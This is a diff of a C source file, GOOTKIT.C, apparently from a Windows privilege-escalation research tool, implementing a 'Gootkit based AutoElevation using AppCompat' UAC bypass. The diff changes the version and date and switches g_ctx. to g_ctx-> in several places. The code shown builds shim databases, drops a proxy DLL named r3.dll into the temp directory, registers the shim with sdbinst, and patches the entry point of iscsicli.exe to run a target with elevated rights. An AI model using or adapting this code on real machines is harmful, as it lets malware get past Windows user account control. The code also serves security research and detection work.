@@ -5,9 +5,9 @@
 *
 *  TITLE:       GOOTKIT.C
 *
-*  VERSION:     2.87
+*  VERSION:     3.11
 *
-*  DATE:        19 Jan 2018
+*  DATE:        23 Nov 2018
 *
 *  Gootkit based AutoElevation using AppCompat.
 *
@@ -69,7 +69,7 @@ BOOL ucmRegisterAndRunTarget(
     _strcat(szSdbinstPath, SYSWOW64_DIR);
     _strcat(szSdbinstPath, SDBINST_EXE);
 #else
-    _strcpy(szSdbinstPath, g_ctx.szSystemDirectory);
+    _strcpy(szSdbinstPath, g_ctx->szSystemDirectory);
     _strcat(szSdbinstPath, SDBINST_EXE);
 #endif
 
@@ -91,7 +91,7 @@ BOOL ucmRegisterAndRunTarget(
         _strcpy(szCmd, USER_SHARED_DATA->NtSystemRoot);
         _strcat(szCmd, SYSWOW64_DIR);
 #else
-        _strcpy(szCmd, g_ctx.szSystemDirectory);
+        _strcpy(szCmd, g_ctx->szSystemDirectory);
 #endif
         _strcat(szCmd, lpTarget);
         bResult = supRunProcess(szCmd, NULL);
@@ -144,7 +144,7 @@ BOOL ucmShimRedirectEXE(
         (CoCreateGuid(&exeGUID) != S_OK)) return bResult;
 
     RtlSecureZeroMemory(szShimDbPath, sizeof(szShimDbPath));
-    _strcpy(szShimDbPath, g_ctx.szTempDirectory);
+    _strcpy(szShimDbPath, g_ctx->szTempDirectory);
     _strcat(szShimDbPath, MYSTERIOUSCUTETHING);
     _strcat(szShimDbPath, L".sdb");
 
@@ -239,13 +239,13 @@ BOOL ucmShimPatch(
 
         // drop Fubuki
         RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-        _strcpy(szBuffer, g_ctx.szTempDirectory);
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
         _strcat(szBuffer, L"r3.dll");
         if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
             break;
 
         RtlSecureZeroMemory(szShimDbPath, sizeof(szShimDbPath));
-        _strcpy(szShimDbPath, g_ctx.szTempDirectory);
+        _strcpy(szShimDbPath, g_ctx->szTempDirectory);
         _strcat(szShimDbPath, INAZUMA_REV);
         _strcat(szShimDbPath, L".sdb");
         hpdb = SdbCreateDatabase(szShimDbPath, DOS_PATH);
@@ -276,7 +276,7 @@ BOOL ucmShimPatch(
         SdbWriteStringTag(hpdb, TAG_NAME, BINARYPATH_TAG);
 
         // query EP RVA for target
-        _strcpy(szBuffer, g_ctx.szSystemDirectory);
+        _strcpy(szBuffer, g_ctx->szSystemDirectory);
         _strcat(szBuffer, ISCSICLI_EXE);
         epRVA = supQueryEntryPointRVA(szBuffer);
         if (epRVA == 0)
